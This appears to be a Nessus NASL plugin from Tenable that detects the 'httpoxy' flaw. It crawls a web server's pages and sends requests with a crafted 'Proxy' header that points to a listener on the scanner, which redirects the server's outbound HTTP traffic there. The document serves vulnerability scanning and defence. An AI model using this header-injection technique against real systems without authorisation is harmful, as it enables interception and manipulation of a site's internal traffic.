#TRUSTED 775c3150fcfc29f7829afe80974f6d0326d32bc802635e5b93cbf137193f0ced3898e2ca26f712cd5e612644428d7eab04981a2bada6c1b3eb4c102a404dc237f9dc26b39c76c2a0510997b422606cbd8d3da0a5b77264390d39c6805751caf353c9c4e6cdcb2574541f97379b7c55d280e29be423afa684ca68ce0aa31e2b6295a964db327cf6330dbc46cae6a25b04ca6d0982286ff2e158f2d64f51bcbfcf59e53db293e8fd3ba30ee84b0d391a69321b3365a865912c234f5df7439218941636a8d179dcdf2467b2a96b981671b2df8a4a1cf05171d6490e0ec77ab4a561b3ad3fac812cc87051d8de71c8d8e34a85152ea8b7d0b6adf84ad2b8a753b23b68c9cba433b5984fe694e9ec4bc8c37367951e7a6e791e32fc6a4c6fb15d76899205c8b783c01e24ef30a39a57b65b104a990d6b12279f1524ebdff5114206060fb94643bc729d86c88d55a9a22f55b68913beda35a16949cf9895bde56a0d348c5731993b4609e382cbf9bf5273e9a53cf63a559f78a3153f048d2691ff5c2d3838fb4d76d9086fcbb2c6b96bb3c006f0123c1cbf9d9ad68532016a2dc3760bfd78c1bff94d57dd2adee3ddafdcb1d0af924a5a209d2ef3edca041f49110d1ef5d8cddd8040cbf9237c57bf46c1d2aeea7dc518052f5e75f85e2f1e0547d0b3a3cd86747dcb55a1b84758bfb790cc77c93fb57179a8137850732b7cf82f3f9d
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(92539);
  script_version("1.2");
  script_set_attribute(attribute:"plugin_modification_date", value:"2016/07/25");

  script_cve_id(
    "CVE-2016-5385",
    "CVE-2016-5386",
    "CVE-2016-5387",
    "CVE-2016-5388",
    "CVE-2016-1000109",
    "CVE-2016-1000110"
  );
  script_bugtraq_id(
    91815,
    91816,
    91818,
    91821
  );
  script_osvdb_id(
    141667,
    141668,
    141669,
    141670,
    141671,
    141672
  );
  script_xref(name:"CERT", value:"797896");

  script_name(english:"HTTP_PROXY Environment Variable Namespace Collision Vulnerability (httpoxy)");
  script_summary(english:"Checks if the web application responds to a crafted Proxy header in an HTTP request.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application is affected by a man-in-the-middle
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The web application running on the remote web server is affected by a
man-in-the-middle vulnerability known as 'httpoxy' due to a failure to
properly resolve namespace conflicts in accordance with RFC 3875
section 4.1.18. The HTTP_PROXY environment variable is set based on
untrusted user data in the 'Proxy' header of HTTP requests. The
HTTP_PROXY environment variable is used by some web client libraries
to specify a remote proxy server. An unauthenticated, remote attacker
can exploit this, via a crafted 'Proxy' header in an HTTP request, to
redirect an application's internal HTTP traffic to an arbitrary proxy
server where it may be observed or manipulated."); 
  script_set_attribute(attribute:"see_also", value:"https://httpoxy.org/");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/oss-sec/2016/q3/94");
  script_set_attribute(attribute:"solution", value:
"Applicable libraries and products should be updated to address this
vulnerability. Please consult the library or product vendor for
available updates.

If updating the libraries and products is not an option, or if updates
are unavailable, filter 'Proxy' request headers on all inbound
requests.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/07/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/07/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:php:php");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:golang:go");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:http_server");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:tomcat");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:python:python");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:facebook:hiphop_virtual_machine");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");

  script_dependencie("webmirror.nasl");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("http.inc");

port = get_http_port(default: 80);

urls = make_list();

# Fix for webmirror_uri "no such table" errors
table = query_scratchpad("SELECT name FROM sqlite_master where type = 'table' and name = 'webmirror_uri'");
if (empty_or_null(table)) exit(1, "Unable to obtain webmirror_uri table from webmirror crawl.");

# Query Scratchpad for webmirror results with a status code of 200
# and load results into urls list
res = query_scratchpad("SELECT DISTINCT uri FROM webmirror_uri WHERE port = ? AND status_code = 200 ORDER BY uri ASC", port);
if (empty_or_null(res)) exit(1, 'Unable to obtain crawled URIs from webmirror scratchpad.');

# Loop through filters to discard URLs we don't care about testing
i = 0;
foreach url (res)
{
  if (
       # Filter out Apache directory listings page sorting
       url['uri'] !~ "/\?[CO]\=[NDMSA](%|$)" &&
       # Filter out static text files
       url['uri'] !~ "\.(md|js|css|scss|txt|csv|xml)($|\?)" &&
       # Filter out image files
       url['uri'] !~ "\.(gif|jpeg|jpg|png|svg|ttf|eot|woff|ico)($|\?)" &&
       # Filter out binary files
       url['uri'] !~ "\.(exe|zip|gz|tar)($|\?)" &&
       # Filter out document files
       url['uri'] !~ "\.(rtf|doc|docx|pdf|xls|xlt)($|\?)"
     )
  {
    # Strip any trailing args from URLs to get the url count down
    if ("?" >< url['uri'])
      url['uri'] = ereg_replace(pattern:"(.*)\?.*", replace:"\1", string:url['uri']);

    urls = make_list(urls, url['uri']);
    i++;
  }
  # If thorough_tests is not enabled, stop at 10 urls
  if (!thorough_tests && i > 10) break;
}

# If we have no URLs to check, bail out
if (empty_or_null(urls))
  audit(AUDIT_WEB_FILES_NOT, "dynamic content", port);

urls = list_uniq(urls);
scanner_ip = this_host();
target_ip = get_host_ip();
pat = "HTTP/1\.(0|1)";
vuln = FALSE;

foreach url (urls)
{
  # If we get an empty url string, just go to the next
  if(empty_or_null(url)) continue;
  listener = bind_sock_tcp();
  if (!listener) audit(AUDIT_SOCK_FAIL, 'tcp', 'unknown');

  s_port = listener[1];
  s = listener[0];

  # Exploit is scanner's IP and our listener's socket in the Proxy header
  exploit = scanner_ip + ':' + s_port;
  v = http_mk_get_req(port: port, item: url, add_headers: make_array("Proxy", exploit));
  req = http_mk_buffer_from_req(req: v);
  # We don't need to check the response we get back from the request's socket
  req = http_send_recv_buf(port:port, data:req);

  # When we have a successful attack, we won't get a response returned
  # to req, since the proxied request causes the server-side script to
  # pause execution and timeout without a response. Since we check for
  # NULL here, we can bypass the listener socket timeout for non-vuln
  # URLs to process through the URL queue faster.
  if(isnull(req))
  {
    # Instead we're more interested in if we get data on the listener socket
    soc = sock_accept(socket:s, timeout:3);
    res = recv(socket:soc, length:1024, timeout:3);
    close(s);
  }
  else
  {
    res = NULL;
    close(s);
  }

  if (!empty_or_null(res) && (res =~ pat))
  {
    vuln = TRUE;
    report = '\nThe full request used to detect this flaw was :\n\n' +
      http_last_sent_request() +
      '\n\nThe server sent back the following data to the listener on port ' + s_port + ':\n\n' +
      res +
      '\n';
  }

  # Stop after first vulnerable page is found
  if (vuln) break;
}

if (vuln)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    extra      : report
  );
  exit(0);
}
audit(AUDIT_WEB_SERVER_NOT_AFFECTED, port);
